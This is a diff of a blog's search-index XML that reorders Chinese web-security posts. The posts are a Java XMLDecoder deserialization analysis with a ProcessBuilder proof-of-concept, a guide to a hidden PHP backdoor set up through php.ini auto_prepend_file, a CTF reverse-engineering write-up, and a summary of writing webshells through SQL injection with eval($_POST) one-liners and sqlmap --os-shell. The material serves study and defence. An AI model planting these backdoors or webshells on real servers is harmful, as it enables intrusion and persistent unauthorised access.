@@ -814,15 +814,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Java XMLDecoder反序列化漏洞]]></title>
-    <url>%2F2019%2F01%2F01%2FXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
-    <content type="text"><![CDATA[基本概念XMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象，其位于java.beans包下。 影响版本XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。 Demo1234567891011121314151617181920212223242526272829303132333435363738394041import com.sun.beans.decoder.DocumentHandler;import org.xml.sax.helpers.DefaultHandler;import javax.xml.parsers.SAXParser;import javax.xml.parsers.SAXParserFactory;import java.io.BufferedInputStream;import java.io.File;import java.io.FileInputStream;import java.beans.XMLDecoder;public class test &#123; public static void XMLDecode_Deserialize(String path) throws Exception &#123; File file = new File(path); FileInputStream fis = new FileInputStream(file); BufferedInputStream bis = new BufferedInputStream(fis); XMLDecoder xd = new XMLDecoder(bis); xd.readObject(); xd.close(); &#125; public static void main(String[] args)&#123; //XMLDecode Deserialize Test String path = "poc.xml"; try &#123; XMLDecode_Deserialize(path);// File f = new File(path);// SAXParserFactory sf = SAXParserFactory.newInstance();// SAXParser sp = sf.newSAXParser();//// DefaultHandler dh = new DefaultHandler();// DocumentHandler dh = new DocumentHandler();// sp.parse(f, dh); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; Payload： poc.xml，可以看到java标签的class属性指定XMLDecoder类，对象标签指定ProcessBuilder类、void标签指定方法为start，即可调用ProcessBuilder.start()来执行其中的命令。 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt; &lt;object class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="1"&gt; &lt;void index="0"&gt; &lt;string&gt;calc&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start" /&gt; &lt;/object&gt;&lt;/java&gt; 运行后，会弹出计算器： 调试分析在IDEA下设置断点跟踪调试。 在readObject()处设置断点，可看到XMLDecoder对象xd的input属性包含了输入XML文档的路径： 继续往里调试，调用到XMLDecoder.parsingComplete()时，发现里面调用了 XMLDecoder.this.handler.parse()，其中this.handler即为DocumentHandler，换句话说，就是调用了DocumentHandler.parser()来解析输入的XML文档内容： 跟踪进去，可以看到DocumentHandler.parser()中调用了如下函数来解析XML内容： 1SAXParserFactory.newInstance().newSAXParser().parse() 接着设置xmlReader的相关handler，如处理XML内容、实体、错误、文档类型定义、文件等句柄，最后调用xmlReader.parse()解析XML文件内容： 继续调试，在XML11Configuration.parse()中发现调用determineDocVersion()： 跟踪进去发现，determineDocVersion()主要获取XML实体扫描器然后扫描解析\&lt;?xml version=…?&gt;来获取XML文档的版本信息： 返回版本信息后，继续往下在XML11Configuration.parse()中调用startDocumentParsing()函数，主要是重置扫描器的版本配置并开始文件扫描准备，其中开始文件扫描准备是调用startEntity()函数（跟踪进去可以看到是通知扫描器开始实体扫描，其中文档实体的伪名称为“[xml]”、DTD的伪名称为“[dtd]”、参数实体名称以“%”开头；接着函数内部会调用startDocument()函数开始准备文件扫描）： 可以看到最后调用到的startDocument()函数会清空当前对象和句柄为文件扫描的开始做准备： 返回到XML11Configuration.parse()中继续往下调试，调用scanDocument()开始文件扫描： 进入scanDocument()，可以看到设置实体句柄后，主要是执行do while循环体，其中的包含START_DOCUMENT、START_ELEMENT、CHARACTERS、SPACE、ENTITY_REFERENCE、PROCESSING_INSTRUCTION、COMMENT、DTD、CDATA、NOTATION_DECLARATION、ENTITY_DECLARATION、NAMESPACE、ATTRIBUTE、END_ELEMENT等的扫描识别： 中间XML节点解析的过程不用过多分析，调试至END_ELEMENT时，可以看到其中提取出“calc”参数值： 跟踪进去后面的getValueObject()函数，可以看到变量var3和var4，分别为获取到ProcessBuilder类名和start方法名，在调用Expression()： 继续跟踪到里面，最后会调用MethodUtil.invoke()方法实现反射执行任意类方法： 再次F7直接执行了代码弹出计算器： 整体地看一下，整个调用过程大致如下： 1XMLDecoder.readObject() -&gt; XMLDecoder.parsingCompelete() -&gt; DocumentHandler.parse() -&gt; SAXParserFactory.newInstance().newSAXParser().parse() -&gt; xmlReader.parse() 可以发现，XMLDecoder类解析XML是调用DocumentHandler类实现的，而DocumentHandler类是基于SAXParser类对XML的解析上的。 那么可以去分析一下，到底哪个类才是真正的漏洞类。测试一下，可以看出DocumentHandler类才是XMLDecoder反序列化漏洞的根源类： 检测方法全局搜索XMLDecoder关键字，排查是否调用readObject()函数且参数是否可控。 防御方法若可以尽量不使用XMLDecoder反序列化XML内容；若使用则尽量确保参数不可由外界输入，尽量以白名单的方式限定XML文档名且结合严格的过滤机制。]]></content>
+    <title><![CDATA[Windows下的一种PHP隐藏后门姿势]]></title>
+    <url>%2F2019%2F01%2F01%2FWindows%E4%B8%8B%E7%9A%84%E4%B8%80%E7%A7%8DPHP%E9%9A%90%E8%94%BD%E5%90%8E%E9%97%A8%E5%A7%BF%E5%8A%BF%2F</url>
+    <content type="text"><![CDATA[在Windows中的PHP解释环境中有两个函数能够自动加载文件，即auto_prepend_file和auto_append_file，其在php.ini中可修改成任意文件，可为PHP或DLL文件。将后门代码写入这两个文件，再修改include_path为后门文件的绝对路径，则Web站点下所有的PHP文件都可以作为PHP后门。 1、修改auto_prepend_file和auto_append_file： 在php.ini中找到这两个配置项，去掉注释，添加上后门文件名，如： 2、修改include_path： 在php.ini中找到该配置项，注意是Windows版本的，去掉注释并添加后门文件所在的绝对路径，如下： 3、创建后门文件： 在include_path指示的路径上创建auto_prepend_file和auto_append_file指定文件名的两个后门文件，如下： 之后直接使用菜刀带上密码访问Web站点任意一个PHP页面即可获取shell：]]></content>
       <categories>
-        <category>Java</category>
+        <category>PHP</category>
       </categories>
       <tags>
         <tag>Web安全</tag>
-        <tag>Java</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -863,15 +863,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Windows下的一种PHP隐藏后门姿势]]></title>
-    <url>%2F2019%2F01%2F01%2FWindows%E4%B8%8B%E7%9A%84%E4%B8%80%E7%A7%8DPHP%E9%9A%90%E8%94%BD%E5%90%8E%E9%97%A8%E5%A7%BF%E5%8A%BF%2F</url>
-    <content type="text"><![CDATA[在Windows中的PHP解释环境中有两个函数能够自动加载文件，即auto_prepend_file和auto_append_file，其在php.ini中可修改成任意文件，可为PHP或DLL文件。将后门代码写入这两个文件，再修改include_path为后门文件的绝对路径，则Web站点下所有的PHP文件都可以作为PHP后门。 1、修改auto_prepend_file和auto_append_file： 在php.ini中找到这两个配置项，去掉注释，添加上后门文件名，如： 2、修改include_path： 在php.ini中找到该配置项，注意是Windows版本的，去掉注释并添加后门文件所在的绝对路径，如下： 3、创建后门文件： 在include_path指示的路径上创建auto_prepend_file和auto_append_file指定文件名的两个后门文件，如下： 之后直接使用菜刀带上密码访问Web站点任意一个PHP页面即可获取shell：]]></content>
+    <title><![CDATA[Java XMLDecoder反序列化漏洞]]></title>
+    <url>%2F2019%2F01%2F01%2FXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[基本概念XMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象，其位于java.beans包下。 影响版本XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。 Demo1234567891011121314151617181920212223242526272829303132333435363738394041import com.sun.beans.decoder.DocumentHandler;import org.xml.sax.helpers.DefaultHandler;import javax.xml.parsers.SAXParser;import javax.xml.parsers.SAXParserFactory;import java.io.BufferedInputStream;import java.io.File;import java.io.FileInputStream;import java.beans.XMLDecoder;public class test &#123; public static void XMLDecode_Deserialize(String path) throws Exception &#123; File file = new File(path); FileInputStream fis = new FileInputStream(file); BufferedInputStream bis = new BufferedInputStream(fis); XMLDecoder xd = new XMLDecoder(bis); xd.readObject(); xd.close(); &#125; public static void main(String[] args)&#123; //XMLDecode Deserialize Test String path = "poc.xml"; try &#123; XMLDecode_Deserialize(path);// File f = new File(path);// SAXParserFactory sf = SAXParserFactory.newInstance();// SAXParser sp = sf.newSAXParser();//// DefaultHandler dh = new DefaultHandler();// DocumentHandler dh = new DocumentHandler();// sp.parse(f, dh); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; Payload： poc.xml，可以看到java标签的class属性指定XMLDecoder类，对象标签指定ProcessBuilder类、void标签指定方法为start，即可调用ProcessBuilder.start()来执行其中的命令。 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt; &lt;object class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="1"&gt; &lt;void index="0"&gt; &lt;string&gt;calc&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start" /&gt; &lt;/object&gt;&lt;/java&gt; 运行后，会弹出计算器： 调试分析在IDEA下设置断点跟踪调试。 在readObject()处设置断点，可看到XMLDecoder对象xd的input属性包含了输入XML文档的路径： 继续往里调试，调用到XMLDecoder.parsingComplete()时，发现里面调用了 XMLDecoder.this.handler.parse()，其中this.handler即为DocumentHandler，换句话说，就是调用了DocumentHandler.parser()来解析输入的XML文档内容： 跟踪进去，可以看到DocumentHandler.parser()中调用了如下函数来解析XML内容： 1SAXParserFactory.newInstance().newSAXParser().parse() 接着设置xmlReader的相关handler，如处理XML内容、实体、错误、文档类型定义、文件等句柄，最后调用xmlReader.parse()解析XML文件内容： 继续调试，在XML11Configuration.parse()中发现调用determineDocVersion()： 跟踪进去发现，determineDocVersion()主要获取XML实体扫描器然后扫描解析\&lt;?xml version=…?&gt;来获取XML文档的版本信息： 返回版本信息后，继续往下在XML11Configuration.parse()中调用startDocumentParsing()函数，主要是重置扫描器的版本配置并开始文件扫描准备，其中开始文件扫描准备是调用startEntity()函数（跟踪进去可以看到是通知扫描器开始实体扫描，其中文档实体的伪名称为“[xml]”、DTD的伪名称为“[dtd]”、参数实体名称以“%”开头；接着函数内部会调用startDocument()函数开始准备文件扫描）： 可以看到最后调用到的startDocument()函数会清空当前对象和句柄为文件扫描的开始做准备： 返回到XML11Configuration.parse()中继续往下调试，调用scanDocument()开始文件扫描： 进入scanDocument()，可以看到设置实体句柄后，主要是执行do while循环体，其中的包含START_DOCUMENT、START_ELEMENT、CHARACTERS、SPACE、ENTITY_REFERENCE、PROCESSING_INSTRUCTION、COMMENT、DTD、CDATA、NOTATION_DECLARATION、ENTITY_DECLARATION、NAMESPACE、ATTRIBUTE、END_ELEMENT等的扫描识别： 中间XML节点解析的过程不用过多分析，调试至END_ELEMENT时，可以看到其中提取出“calc”参数值： 跟踪进去后面的getValueObject()函数，可以看到变量var3和var4，分别为获取到ProcessBuilder类名和start方法名，在调用Expression()： 继续跟踪到里面，最后会调用MethodUtil.invoke()方法实现反射执行任意类方法： 再次F7直接执行了代码弹出计算器： 整体地看一下，整个调用过程大致如下： 1XMLDecoder.readObject() -&gt; XMLDecoder.parsingCompelete() -&gt; DocumentHandler.parse() -&gt; SAXParserFactory.newInstance().newSAXParser().parse() -&gt; xmlReader.parse() 可以发现，XMLDecoder类解析XML是调用DocumentHandler类实现的，而DocumentHandler类是基于SAXParser类对XML的解析上的。 那么可以去分析一下，到底哪个类才是真正的漏洞类。测试一下，可以看出DocumentHandler类才是XMLDecoder反序列化漏洞的根源类： 检测方法全局搜索XMLDecoder关键字，排查是否调用readObject()函数且参数是否可控。 防御方法若可以尽量不使用XMLDecoder反序列化XML内容；若使用则尽量确保参数不可由外界输入，尽量以白名单的方式限定XML文档名且结合严格的过滤机制。]]></content>
       <categories>
-        <category>PHP</category>
+        <category>Java</category>
       </categories>
       <tags>
         <tag>Web安全</tag>
-        <tag>PHP</tag>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -898,6 +898,17 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[HITB Binary 100 writeup]]></title>
+    <url>%2F2019%2F01%2F01%2FHITB_Binary_100_writeup%2F</url>
+    <content type="text"><![CDATA[HITB Binary 100是之前的HITB CTF的一道简单的逆向题，这里简单做一遍。 下载hitb-bin100.elf 将elf文件先跑一下，发现像歌词播放一样、每个一秒钟左右输出一句话，歌词好像没啥用，而且运行很久也还没停下来： 根据字符串检索法，扔到IDA的String窗口查看是否存在关键字符串，可以看到有“FLAG”相关的字符串： 点击进去查看，发现这段代码是在main()函数中的： 接着查看一下该二进制文件的函数等信息： 在Function Window也可以看到，除了调用一些标准库的函数，整个程序几乎都编译到了main函数中： 查看main函数的汇编代码，可以看到有两个地址值得研究，即4007e8和400803，因为其中都是会调用printf函数输出内容： 直接在GDB上运行并jump到相应的地址查看： 可以看到，KEY是正常的输出出来了，但是FLAG输出的是一堆乱码，然后就出现“stack smashing detected”的错误而终止运行了。跳过去直接输出Flag是不可能的了。 F5看一下伪代码吧，看到在输出flag前一段主要的代码： 分析可知，v20变量存放的是该循环执行的次数、无法改变；v21变量调用time函数生成一个时间戳，用于后续与v6变量的相减形成随机种子值；v11变量用于内循环执行的次数，从0-36；v6变量同样调用time函数生成一个时间戳，与v21变量不同在于每次内循环结束后重新生成时间戳时都会先sleep 1s后再生成；在内循环的最后是一个sleep()函数，调用来休眠1s；其余的代码都是用于生成输出的字符串。 这里如果想直接nop掉sleep()函数是行不通的，因为整段代码的执行依赖于该sleep()函数，v6与v21的差值在每次内循环结束的时候都会通过sleep()函数实现增一，如果不这样正常处理，将得不到正常的flag。 换个思路，这里关键的两个函数是sleep()和time()，我们可以重新定义该两个函数，通过LD_PRELOAD预先加载这两个函数而不是调用系统自己的从而实现欺骗程序该代码确实是睡眠了1s了，也就是说，自定义的sleep()函数直接对时间变量t自增1而不是真的等待了一秒才运行结束，从而可以将程序的休眠时间去掉： gcc编译为so文件（-fpic参数指定为位置无关、即使用相对地址，-shared参数指定为共享库），再通过LD_PRELOAD在该elf程序运行前优先加载生成的动态链接库time.so并管道输出到一个文件中查看，可以看到输出了flag：]]></content>
+      <categories>
+        <category>WriteUp:Reverse</category>
+      </categories>
+      <tags>
+        <tag>二进制</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[SQL注入写WebShell方式小结]]></title>
     <url>%2F2019%2F01%2F01%2FSQL%E6%B3%A8%E5%85%A5%E5%86%99WebShell%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93%2F</url>
     <content type="text"><![CDATA[这里小结一下通过SQL注入写入WebShell的方法。 通过SQL注入select into outfile实现，如： 1’ union select 1,’\&lt;?php eval($_POST[a]);?&gt;’ INTO OUTFILE ‘/var/www/tmp/nb.php’# 前提都是需要对目标目录具有写权限。 –os-cmd=”net user”交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。 ##–os-shell写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。注意:关闭sqlmap文件就会被删除。 ##本地写入webshell先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。 注意需要最高权限。 MySQL写木马，通常可以通过phpmyadmin来实现。 前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。 1、创建一个表 CREATE TABLE a (cmd text NOT NULL); 2、插入数据 INSERT INTO a (cmd) VALUES(‘\&lt;?php eval($_POST[‘password’]);?&gt;’); 3、导出一句话 SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’; 4、删除表 Drop TABLE IF EXISTS a;]]></content>
@@ -907,17 +918,6 @@
       <tags>
         <tag>Web安全</tag>
         <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[HITB Binary 100 writeup]]></title>
-    <url>%2F2019%2F01%2F01%2FHITB_Binary_100_writeup%2F</url>
-    <content type="text"><![CDATA[HITB Binary 100是之前的HITB CTF的一道简单的逆向题，这里简单做一遍。 下载hitb-bin100.elf 将elf文件先跑一下，发现像歌词播放一样、每个一秒钟左右输出一句话，歌词好像没啥用，而且运行很久也还没停下来： 根据字符串检索法，扔到IDA的String窗口查看是否存在关键字符串，可以看到有“FLAG”相关的字符串： 点击进去查看，发现这段代码是在main()函数中的： 接着查看一下该二进制文件的函数等信息： 在Function Window也可以看到，除了调用一些标准库的函数，整个程序几乎都编译到了main函数中： 查看main函数的汇编代码，可以看到有两个地址值得研究，即4007e8和400803，因为其中都是会调用printf函数输出内容： 直接在GDB上运行并jump到相应的地址查看： 可以看到，KEY是正常的输出出来了，但是FLAG输出的是一堆乱码，然后就出现“stack smashing detected”的错误而终止运行了。跳过去直接输出Flag是不可能的了。 F5看一下伪代码吧，看到在输出flag前一段主要的代码： 分析可知，v20变量存放的是该循环执行的次数、无法改变；v21变量调用time函数生成一个时间戳，用于后续与v6变量的相减形成随机种子值；v11变量用于内循环执行的次数，从0-36；v6变量同样调用time函数生成一个时间戳，与v21变量不同在于每次内循环结束后重新生成时间戳时都会先sleep 1s后再生成；在内循环的最后是一个sleep()函数，调用来休眠1s；其余的代码都是用于生成输出的字符串。 这里如果想直接nop掉sleep()函数是行不通的，因为整段代码的执行依赖于该sleep()函数，v6与v21的差值在每次内循环结束的时候都会通过sleep()函数实现增一，如果不这样正常处理，将得不到正常的flag。 换个思路，这里关键的两个函数是sleep()和time()，我们可以重新定义该两个函数，通过LD_PRELOAD预先加载这两个函数而不是调用系统自己的从而实现欺骗程序该代码确实是睡眠了1s了，也就是说，自定义的sleep()函数直接对时间变量t自增1而不是真的等待了一秒才运行结束，从而可以将程序的休眠时间去掉： gcc编译为so文件（-fpic参数指定为位置无关、即使用相对地址，-shared参数指定为共享库），再通过LD_PRELOAD在该elf程序运行前优先加载生成的动态链接库time.so并管道输出到一个文件中查看，可以看到输出了flag：]]></content>
-      <categories>
-        <category>WriteUp:Reverse</category>
-      </categories>
-      <tags>
-        <tag>二进制</tag>
       </tags>
   </entry>
   <entry>
